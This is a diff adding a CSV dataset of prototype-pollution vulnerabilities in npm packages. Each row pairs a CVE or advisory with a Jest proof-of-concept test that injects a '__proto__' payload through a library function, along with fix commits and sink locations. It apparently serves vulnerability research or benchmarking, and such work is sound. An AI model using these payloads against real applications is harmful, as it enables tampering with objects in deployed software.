@@ -1,0 +1,2380 @@
+Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
+prototype-pollution,CVE-2020-28269,field,1.0.1,n/a,prototype-pollution/field_1.0.1,"//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
+test(""prototype pollution in field "", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const field = require(""field"");
+  const obj = {};
+  field.set(obj, ""__proto__.polluted"", ""yes"");
+
+  expect(obj.polluted).toBe(""yes"");
+});
+",n/a,lib/field.js:50:20,https://security.snyk.io/vuln/SNYK-JS-FIELD-1039884; https://github.com/advisories/GHSA-hm82-qr45-h7mw
+prototype-pollution,CVE-2021-23624,dotty,0.0.1,0.1.2,prototype-pollution/dotty_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
+test(""prototype pollution in dotty"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const dotty = require(""dotty"");
+  dotty.put({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/deoxxa/dotty/commit/88f61860dcc274a07a263c32cbe9d44c24ef02d7,lib/index.js:147:17,https://security.snyk.io/vuln/SNYK-JS-DOTTY-1577292; https://github.com/advisories/GHSA-6g47-63mv-qpgh
+prototype-pollution,CVE-2020-7765,@firebase/util,0.3.2,0.3.4,prototype-pollution/firebase-util_0.3.2,"//https://hackerone.com/reports/1001218
+test(""prototype pollution in @firebase/util"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const utils = require(""@firebase/util"");
+  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  utils.deepExtend({}, source);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
+prototype-pollution,CVE-2020-28472,@aws-sdk/shared-ini-file-loader,1.0.0-rc.8,1.0.0-rc.9,prototype-pollution/aws-sdk-shared-ini-file-loader_1.0.0-rc.8,"//https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304
+test(""prototype pollution in @aws-sdk/shared-ini-file-loader"", () => {
+  expect({}.polluted).toBe(undefined);
+  var fs = require(""fs"");
+  var sharedIniFileLoader = require(""@aws-sdk/shared-ini-file-loader"");
+
+  var parsed = sharedIniFileLoader.loadSharedConfigFiles({
+    filepath: ""./payload.toml"",
+  });
+  parsed.then(() => {
+    expect({}.polluted).toBe(""yes"");
+  });
+});
+",https://github.com/aws/aws-sdk-js/pull/3585/commits/7d72aff2a941173733fcb6741b104cd83d3bc611,shared-ini-file-loader/src/index.ts:108:20,https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304; https://github.com/advisories/GHSA-rrc9-gqf8-8rwg
+prototype-pollution,CVE-2020-28495,total.js,3.4.6,3.4.7,prototype-pollution/total.js_3.4.6,"//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
+test(""prototype pollution in total.js"", () => {
+  const total = require(""total.js"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  U.set({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/totaljs/framework/commit/b3f901561d66ab799a4a99279893b94cad7ae4ff,"utils.js:6624:11, <anonymous",https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046671; https://github.com/advisories/GHSA-6cf8-qhqj-vjqm
+prototype-pollution,,mithril,1.0.0,1.1.7,prototype-pollution/mithril_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
+test(""prototype pollution in mithril"", () => {
+  require(""mithril/test-utils/browserMock"")(global);
+  const m = require(""mithril"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  m.parseQueryString(""__proto__%5Bpolluted%5D=yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/MithrilJS/mithril.js/commit/97fa1788c2184ff4b87fd3f558b7003f9eeee2b1,mithril.js:982:19,https://security.snyk.io/vuln/SNYK-JS-MITHRIL-460113; https://github.com/advisories/GHSA-c3px-v9c7-m734
+prototype-pollution,CVE-2020-7788,ini,1.3.5,n/a,prototype-pollution/ini_1.3.5,"//https://snyk.io/vuln/SNYK-JS-INI-1048974
+test(""prototype pollution in ini"", () => {
+  const fs = require(""fs"");
+  const path = require(""path"");
+  const ini = require(""ini"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,ini.js:109:14,https://security.snyk.io/vuln/SNYK-JS-INI-1048974; https://github.com/advisories/GHSA-qqgx-2p2h-9c37
+prototype-pollution,CVE-2018-3719,mixin-deep,1.3.0,1.3.1,prototype-pollution/mixin-deep_1.3.0,"//https://hackerone.com/reports/311236
+test(""prototype pollution in mixin-deep "", () => {
+  const mixin = require(""mixin-deep"");
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  mixin({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/mixin-deep/commit/578b0bc5e74e14de9ef4975f504dc698796bdf9c,index.js:30:15,https://hackerone.com/reports/311236; https://security.snyk.io/vuln/npm:mixin-deep:20180215; https://github.com/advisories/GHSA-3mpr-hq3p-49h9
+prototype-pollution,CVE-2020-7792,mout,1.0.0,1.2.3,prototype-pollution/mout_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
+test(""prototype pollution in mout "", () => {
+  var mout = require(""mout"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  mout.object.set(obj, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,object/set.js:9:48,https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544; 
+prototype-pollution,CVE-2021-23444,jointjs,2.2.1,3.4.2,prototype-pollution/jointjs_2.2.1,"//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
+test(""prototype pollution in jointjs"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const jointjs = require(""jointjs"");
+  jointjs.util.setByPath({}, ""__proto__/polluted"", ""yes"", ""/"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:49:1313,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
+prototype-pollution,,mergify,1.0.2,n/a,prototype-pollution/mergify_1.0.2,"//https://hackerone.com/reports/439098
+test(""prototype pollution in mergify"", () => {
+  const mergify = require(""mergify"");
+  const payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  mergify({}, JSON.parse(payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:15:11,https://security.snyk.io/vuln/SNYK-JS-MERGIFY-72673; https://github.com/advisories/GHSA-3f95-w5h5-fq86
+prototype-pollution,CVE-2019-10745,assign-deep,1.0.0,1.0.1,prototype-pollution/assign-deep_1.0.0,"//https://snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211
+test(""prototype pollution in assign-deep "", () => {
+  const assign = require(""assign-deep"");
+  const payloads = ['{""__proto__"": {""polluted"": ""yes""}}'];
+
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  assign({}, JSON.parse(payloads[0]));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/assign-deep/commit/90bf1c551d05940898168d04066bbf15060f50cc,index.js:22:23,https://security.snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211; https://github.com/advisories/GHSA-66rh-8fw6-59q6
+prototype-pollution,CVE-2020-28449,decal,2.0.0,n/a,prototype-pollution/decal_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007
+test(""prototype pollution in decal"", () => {
+  const decal = require(""decal"");
+
+  expect({}.polluted).toBe(undefined);
+  decal.set({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/utils/set.js:62:21,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007; https://github.com/advisories/GHSA-vp77-fqqp-79j8
+prototype-pollution,CVE-2020-24939,supermixer,1.0.3,1.0.5,prototype-pollution/supermixer_1.0.3,"//hackerone.com/reports/959987
+
+https: test(""prototype pollution in supermixer"", () => {
+  var mixer = require(""supermixer"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+  var payload = '{""__proto__"":{""polluted"":""yes""}}'; //payload
+
+  mixer.merge({}, JSON.parse(payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/stampit-org/supermixer/commit/94dcc6fc45e0fed96187cb52aaffadf76dbbc0a3,dist/mixer.js:86:19,https://security.snyk.io/vuln/SNYK-JS-SUPERMIXER-607909; https://github.com/advisories/GHSA-7prf-vw4p-qr59
+prototype-pollution,CVE-2021-23440,set-value,3.0.0,4.0.1,prototype-pollution/set-value_3.0.0,"//https://snyk.io/vuln/SNYK-JS-SETVALUE-450213
+test(""prototype pollution in set-value "", () => {
+  const setFn = require(""set-value"");
+  const paths = [""__proto__.polluted""];
+
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  setFn({}, paths[0], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452,index.js:41:20,https://security.snyk.io/vuln/SNYK-JS-SETVALUE-1540541; https://github.com/advisories/GHSA-4jqc-8m5r-9rpr
+prototype-pollution,,@fluentui/styles,0.47.15,0.50.0,prototype-pollution/fluentui-styles_0.47.15,"//https://snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808
+
+test(""prototype pollution in @fluentui/style "", () => {
+  const styles = require(""@fluentui/styles"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  const source2 = {
+    k3: {},
+  };
+
+  expect({}.polluted).toBe(undefined);
+
+  let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,styles/dist/commonjs/deepmerge.ts:16:9,https://security.snyk.io/vuln/SNYK-JS-FLUENTUISTYLES-570808; 
+prototype-pollution,CVE-2020-7737,safetydance,2.0.1,n/a,prototype-pollution/safetydance_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687
+
+test(""prototype pollution in safetydance"", () => {
+  const safetydance = require(""safetydance"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  safetydance.set({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:215:25,https://security.snyk.io/vuln/SNYK-JS-SAFETYDANCE-598687; 
+prototype-pollution,,extend-merge,1.0.5,1.0.6,prototype-pollution/extend-merge_1.0.5,"//https://hackerone.com/reports/878339
+test(""prototype pollution in extend-merge"", () => {
+  const extend_merge = require(""extend-merge"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  extend_merge.merge({}, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/crysalead-js/extend-merge/commit/6c8dc4e4b5983fa3e85544716f8e347dea2ba3b0,base-extend.js:41:21,https://security.snyk.io/vuln/SNYK-JS-EXTENDMERGE-609868; 
+prototype-pollution,CVE-2021-23433,algoliasearch-helper,3.6.0,3.6.2,prototype-pollution/algoliasearch-helper_3.6.0,"//https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421
+test(""prototype pollution in algoliasearch-helper"", () => {
+  const algohelp = require(""algoliasearch-helper"");
+  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+
+  expect({}.polluted).toBe(undefined);
+
+  algohelp.SearchParameters._parseNumbers(payload); // {}
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/algolia/algoliasearch-helper-js/commit/4ff542b70b92a6b81cce8b9255700b0bc0817edd,src/functions/merge.js:38:19,https://security.snyk.io/vuln/SNYK-JS-ALGOLIASEARCHHELPER-1570421; https://github.com/advisories/GHSA-vpf5-82c8-9v36
+prototype-pollution,CVE-2021-23574,js-data,3.0.9,n/a,prototype-pollution/js-data_3.0.9,"//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655
+test(""prototype pollution in js-data"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const { utils } = require(""js-data"");
+  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  utils.deepMixIn({}, source);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/js-data/js-data/pull/579/commits/44d69656ce22a0a0300f1e94eb6dcfefd9dcffa4,src/utils.js:487:18,https://security.snyk.io/vuln/SNYK-JS-JSDATA-1584361; https://github.com/advisories/GHSA-c6h4-gc3f-hgjq
+prototype-pollution, CVE-2021-23397,@ianwalter/merge,9.0.1,n/a,prototype-pollution/ianwalter-merge_9.0.1,"//https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022
+test(""prototype pollution in @ianwalter/merge"", () => {
+  const merge = require(""@ianwalter/merge"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  merge({}, EVIL_JSON);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,,https://security.snyk.io/vuln/SNYK-JS-IANWALTERMERGE-1311022; 
+prototype-pollution,CVE-2021-23442,@cookiex/deep,0.0.6,n/a,prototype-pollution/cookiex-deep_0.0.6,"test(""prototype pollution in @cookiex/deep"", () => {
+  const deep = require(""@cookiex/deep"");
+  expect({}.polluted).toBe(undefined);
+
+  const target = {};
+  deep.default(target, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,deep/dist/assigner.js:13:31,https://security.snyk.io/vuln/SNYK-JS-COOKIEXDEEP-1582793; https://github.com/advisories/GHSA-92v9-xh2q-fq9f
+prototype-pollution,CVE-2020-28471,properties-reader,2.0.0,2.2.0,prototype-pollution/properties-reader_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968
+test(""prototype pollution in properties-reader"", () => {
+  const propertiesReader = require(""properties-reader"");
+  const path = require(""path"");
+
+  expect({}.polluted).toBe(undefined);
+
+  propertiesReader(path.resolve(__dirname, ""./payload.ini""));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/steveukx/properties/commit/0877cc871db9865f58dd9389ce99e61be05380a5,src/properties-reader.js:200:27,https://security.snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968; 
+prototype-pollution,CVE-2018-16491,node.extend,1.0.0,2.0.1,prototype-pollution/node-extend_1.0.0,"//https://hackerone.com/reports/430831
+test(""prototype pollution in node.extend "", () => {
+  let extend = require(""node.extend"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/extend.js:86:26,https://security.snyk.io/vuln/SNYK-JS-NODEEXTEND-73641; https://github.com/advisories/GHSA-r96c-57pf-9jjm
+prototype-pollution,CVE-2021-41097,aurelia-path,1.1.0,1.1.7,prototype-pollution/aurelia-path_1.1.7,"//https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346
+test(""prototype pollution in aurelia-path"", () => {
+  const ap = require(""aurelia-path"");
+
+  expect({}.polluted).toBe(undefined);
+
+  ap.parseQueryString(""__proto__[polluted]=yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/aurelia/path/releases/tag/1.1.7,dist/commonjs/aurelia-path.js:163:42,https://security.snyk.io/vuln/SNYK-JS-AURELIAPATH-1292346; https://github.com/advisories/GHSA-3c9c-2p65-qvwv; https://github.com/aurelia/path/issues/44
+prototype-pollution,CVE-2020-28276,deep-set,1.0.0,n/a,prototype-pollution/deep-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28276
+test(""prototype pollution in deep-set"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const deepSet = require(""deep-set"");
+  const obj = { 1: ""2"" };
+  deepSet(obj, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:33:31,https://security.snyk.io/vuln/SNYK-JS-DEEPSET-1054938; 
+prototype-pollution,CVE-2019-10806,vega-util,1.13.0,1.13.1,prototype-pollution/vega-util_1.13.0,"//https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223
+
+test(""prototype pollution in vega-util"", () => {
+  const util = require(""vega-util"");
+  const config = ""{style: {point: {shape: triangle-right}}}"";
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  util.mergeConfig(config, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,build/vega-util.js:203:16,https://security.snyk.io/vuln/SNYK-JS-VEGAUTIL-559223; https://github.com/advisories/GHSA-6hwh-rqwf-cxxr
+prototype-pollution,,think-config,1.0.0,1.1.3,prototype-pollution/think-config_1.0.0,"//https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db
+test(""prototype pollution in x-assign"", () => {
+  const Config = require(""think-config"");
+  const config = new Config({ name: 2 });
+
+  expect({}.polluted).toBe(undefined);
+
+  let obj = {};
+  config.set(""name.__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/thinkjs/think-config/commit/31b82468d72f2e1456a27a4827cea378196db6db,index.js:50:22,https://github.com/advisories/GHSA-6cj2-92m5-7mvp; https://security.snyk.io/vuln/SNYK-JS-THINKCONFIG-1536566
+prototype-pollution,CVE-2018-16489,just-extend,3.0.0,n/a,prototype-pollution/just-extend_3.0.0,"//https://hackerone.com/reports/430291
+test(""prototype pollution in just-extend "", () => {
+  const extend = require(""just-extend"");
+
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  let payload2 = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+  extend(true, {}, payload2);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:52:23,https://security.snyk.io/vuln/SNYK-JS-JUSTEXTEND-72674; https://github.com/advisories/GHSA-675m-85rw-j3w4
+prototype-pollution,CVE-2021-23395,nedb,1.8.0,n/a,prototype-pollution/nedb_1.8.0,"//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
+test(""prototype pollution in nedb"", () => {
+  const Datastore = require(""nedb"");
+  const db = new Datastore();
+
+  expect({}.polluted).toBe(undefined);
+
+  db.insert({ hello: ""world"" }, (err) => {
+    db.update(
+      { hello: ""world"" },
+      { $set: { ""__proto__.polluted"": ""yes"" } },
+      {},
+      (err) => {
+        expect({}.polluted).toBe(""yes"");
+      }
+    );
+  });
+});
+",n/a,lib/model.js:304:14,https://security.snyk.io/vuln/SNYK-JS-NEDB-1305279; https://github.com/advisories/GHSA-339j-hqgx-qrrx
+prototype-pollution,CVE-2021-3815,@fabiocaccamo/utils.js,0.17.0,n/a,prototype-pollution/fabiocaccamo-utils.js_0.17.0,"//https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614
+test(""prototype pollution in @fabiocaccamo/utils.js"", () => {
+  const utils = require(""@fabiocaccamo/utils.js"");
+  const obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  utils.object.keypath.set(obj, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/fabiocaccamo/utils.js/commit/102efafb291ce1916985514440d3bf8a6826890a,utils.js/dist/utils.js:2365:33,https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614; https://github.com/advisories/GHSA-3xph-cp8f-2229
+prototype-pollution,CVE-2020-28271,deephas,1.0.5,1.0.7,prototype-pollution/deephas_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
+test(""prototype pollution in deephas "", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const dh = require(""deephas"");
+  let obj = {};
+  dh.set(obj, ""__proto__.polluted"", ""yes"");
+
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/sharpred/deepHas/commit/2fe011713a6178c50f7deb6f039a8e5435981e20,deepHas.js:65:20,https://security.snyk.io/vuln/SNYK-JS-DEEPHAS-1039845; https://github.com/advisories/GHSA-4fr2-j4g9-mppf
+prototype-pollution,,inireader,1.0.0,2.0.0,prototype-pollution/inireader_1.0.0,"//https://snyk.io/vuln/SNYK-JS-INIREADER-1054843
+test(""prototype pollution in inireader"", () => {
+  const iniReader = require(""inireader"");
+  const path = require(""path"");
+  const parser = new iniReader.IniReader();
+
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  parser.load(path.resolve(__dirname, ""./payload.ini""));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/Ajnasz/IniReader/commit/c260e4e9050c731dbdb88e1d2e23e851528d3d93,lib/inireadercore.js:310:60,https://security.snyk.io/vuln/SNYK-JS-INIREADER-1054843; 
+prototype-pollution,CVE-2020-15256,object-path,0.11.4,0.11.5,prototype-pollution/object-path_0.11.0,"//https://hackerone.com/reports/878332
+test(""prototype pollution in object-path"", () => {
+  const setPath = require(""object-path-set"");
+
+  expect({}.polluted).toBe(undefined);
+  setPath({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036; https://github.com/advisories/GHSA-v39p-96qg-c8rf; https://hackerone.com/reports/878332
+prototype-pollution,CVE-2020-28281,set-object-value,0.0.5, 0.0.6,prototype-pollution/set-object-value_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
+test(""prototype pollution in setObjectValue"", () => {
+  var setObjectValue = require(""set-object-value"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  setObjectValue(obj, [""__proto__"", ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/react-atomic/react-atomic-organism/commit/c8ec63388f7785078cb27275b56ed955ffd3db6c,build/cjs/src/index.js:24:15,https://security.snyk.io/vuln/SNYK-JS-SETOBJECTVALUE-1054931; https://github.com/advisories/GHSA-4jj4-m52p-8rx3
+prototype-pollution,,@lyngs/digger,1.0.7,n/a,prototype-pollution/lyngs-digger_1.0.7,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
+test(""prototype pollution in @lyngs/digge"", () => {
+  const { digger } = require(""@lyngs/digger"");
+  expect({}.polluted).toBe(undefined);
+  digger({}, ""__proto__.polluted"", ""yes"", { extend: true });
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,digger/dist/index.js:2120:23,https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826; 
+prototype-pollution,,convict,6.0.0,6.0.1,prototype-pollution/convict_6.0.0,"//https://snyk.io/vuln/SNYK-JS-CONVICT-1062508
+test(""prototype pollution in node-dig"", () => {
+  const convict = require(""convict"");
+  let obj = {};
+  const config = convict(obj);
+
+  expect({}.polluted).toBe(undefined);
+
+  config.set(""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/main.js:565:24,https://security.snyk.io/vuln/SNYK-JS-CONVICT-1062508; 
+prototype-pollution,,node-dig,1.0.1,n/a,prototype-pollution/node-dig_1.0.1,"//https://snyk.io/vuln/SNYK-JS-NODEDIG-1069825
+test(""prototype pollution in node-dig"", () => {
+  const nodeDig = require(""node-dig"");
+  expect({}.polluted).toBe(undefined);
+
+  nodeDig({}, [""__proto__"", ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/dig/index.js:4:33,https://security.snyk.io/vuln/SNYK-JS-NODEDIG-1069825; 
+prototype-pollution, CVE-2021-25952,just-safe-set,1.0.0,2.2.2,prototype-pollution/just-safe-set_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267
+test(""prototype pollution in just-safe-set"", () => {
+  const justSafeSet = require(""just-safe-set"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  justSafeSet(obj, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/angus-c/just/commit/dd57a476f4bb9d78c6f60741898dc04c71d2eb53,index.js:36:17,https://security.snyk.io/vuln/SNYK-JS-JUSTSAFESET-1316267; https://github.com/advisories/GHSA-v26w-gcxh-v4r7
+prototype-pollution,CVE-2021-23807,jsonpointer,4.0.0,5.0.0,prototype-pollution/jsonpointer_4.0.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288
+test(""prototype pollution in jsonpointer"", () => {
+  const jsonpointer = require(""jsonpointer"");
+
+  expect({}.polluted).toBe(undefined);
+  jsonpointer.set({}, [[""proto""], [""__proto__""], ""polluted""], ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/janl/node-jsonpointer/commit/a0345f3550cd9c4d89f33b126390202b89510ad4,jsonpointer.js:43:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577288; https://github.com/advisories/GHSA-282f-qqgm-c34q
+prototype-pollution,,style-dictionary,2.10.2,2.10.3,prototype-pollution/style-dictionary_2.10.2,"//https://snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632
+test(""prototype pollution in style-dictionary"", () => {
+  const StyleDictionary = require(""style-dictionary"");
+  const obj = {};
+  let opts = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+
+  expect({}.polluted).toBe(undefined);
+
+  StyleDictionary.extend(opts);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/utils/deepExtend.js:76:26,https://security.snyk.io/vuln/SNYK-JS-STYLEDICTIONARY-1080632; 
+prototype-pollution,,@brikcss/merge,1.3.0,n/a,prototype-pollution/brikcss-merge_1.3.0,"//https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594
+test(""prototype pollution in @brikcss/merge"", () => {
+  const merge = require(""@brikcss/merge"");
+  let obj = {};
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",N/A,merge/dist/lib/merge.js:2:1599,https://security.snyk.io/vuln/SNYK-JS-BRIKCSSMERGE-1727594; 
+prototype-pollution,,mquery,3.2.1,3.2.5,prototype-pollution/mquery_3.2.1,"//https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
+test(""prototype pollution in mquery"", () => {
+  const mquery = require(""mquery"");
+  let obj = {};
+  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+
+  expect({}.polluted).toBe(undefined);
+
+  var m = mquery(payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/aheckmann/mquery/commit/158f059e058579d2d08c2f1380689f5f69336778,lib/utils.js:137:15,https://security.snyk.io/vuln/SNYK-JS-MQUERY-1089718; https://github.com/advisories/GHSA-45q2-34rf-mr94
+prototype-pollution,CVE-2020-8158,typeorm,0.2.24,0.2.25,prototype-pollution/typeorm_0.2.24,"//https://hackerone.com/reports/869574
+
+function isObject(item) {
+  return item && typeof item === ""object"" && !Array.isArray(item);
+}
+const assert = require(""assert"");
+
+function mergeDeep(target, ...sources) {
+  if (!sources.length) return target;
+  const source = sources.shift();
+
+  if (isObject(target) && isObject(source)) {
+    for (const key in source) {
+      const value = source[key];
+      if (value instanceof Promise) continue;
+
+      if (
+        isObject(value) &&
+        !(value instanceof Map) &&
+        !(value instanceof Set) &&
+        !(value instanceof Date) &&
+        !(value instanceof Buffer) &&
+        !(value instanceof RegExp) &&
+        !(value instanceof URL)
+      ) {
+        if (!target[key])
+          Object.assign(target, {
+            [key]: Object.create(Object.getPrototypeOf(value)),
+          });
+        mergeDeep(target[key], value);
+      } else {
+        Object.assign(target, { [key]: value });
+      }
+    }
+  }
+
+  return mergeDeep(target, ...sources);
+}
+
+test(""prototype pollution in typeORM"", () => {
+  // const util = require(""typeorm/util/OrmUtils"");
+  const a = {};
+  const b = JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`);
+
+  expect({}.polluted).toBe(undefined);
+
+  // util.OrmUtils.mergeDeep(a, b);
+  mergeDeep(a, b);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-TYPEORM-590152; https://github.com/advisories/GHSA-pf2j-9qmp-jqr2
+prototype-pollution,CVE-2020-7721,node-oojs,1.4.0,n/a,prototype-pollution/node-oojs_1.4.0,"// https://snyk.io/vuln/SNYK-JS-NODEOOJS-598678
+test(""prototype pollution in node-oojs"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  require(""node-oojs"");
+  oojs.setPath({ ""__proto__.polluted"": ""yes"" });
+
+  expect({}.polluted).not.toBe(undefined);
+});
